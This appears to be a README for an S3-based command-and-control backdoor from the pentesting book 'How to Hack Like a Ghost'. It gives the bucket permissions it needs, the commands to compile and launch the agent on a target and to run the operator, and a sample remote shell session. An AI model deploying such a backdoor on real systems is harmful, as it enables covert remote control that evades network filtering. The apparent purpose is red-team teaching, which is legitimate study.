# S3 backdoor
## Intro
This backdoor was featured in How to Hack Like a Ghost to bypass a network filtering policy. It uses S3 as a C2 channel to execute commands and retrieve the output.  
It is composed of an operator and an agent.

## Requirements
This backdoor requires a bucket with the permissions outlined the sample_policy.json filed. The agent on the target does not use AWS access keys, so it needs public GetObject over page_req.txt to read commands and public PutObject over page_resp.txt to send results.

The operator is running on your machine so you can give it full access over the bucket.

## Usage
Compile the agent:
```
$ make linux
```
Launch the agent on the target:
```
$ ./main -bucket <bucket_name>
```
Launch the operator on your machine:
```
$ pip install -r requirements.txt

$ python3 main.py
Queue in commands to be executed

shell> uname
Linux worker 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
## TODO
Port the agent to Windows.

## Author
Sparc Flow - How to Hack Like a Ghost